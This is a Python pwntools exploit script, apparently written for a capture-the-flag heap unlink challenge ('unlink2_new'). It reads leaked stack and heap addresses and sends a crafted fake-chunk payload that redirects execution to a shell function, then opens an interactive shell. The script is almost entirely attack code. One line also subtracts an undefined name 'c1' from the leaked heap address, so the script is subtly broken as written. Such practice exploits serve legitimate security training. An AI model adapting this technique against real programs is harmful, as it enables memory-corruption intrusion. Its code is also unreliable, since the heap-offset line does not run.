#!/usr/bin/env python2
from pwn import *

exe = ELF("./unlink2_new")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"

global io
breakpoints = '''
break main
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

shell = 0x4011b6
rip = -0x28
win = 0xb18
system = exe.got["system"]

reu("leak: ")
stack = int(re(14),16)
log.info("Stack -> "+hex(stack))

reu("leak: ")

heap = int(re(9),16)-c1
log.info("Heap base -> "+hex(heap))

rl()

payload = flat([
    shell,
    0x21,
    stack+rip-8,
    heap+win
    ])
sl(payload)

io.interactive()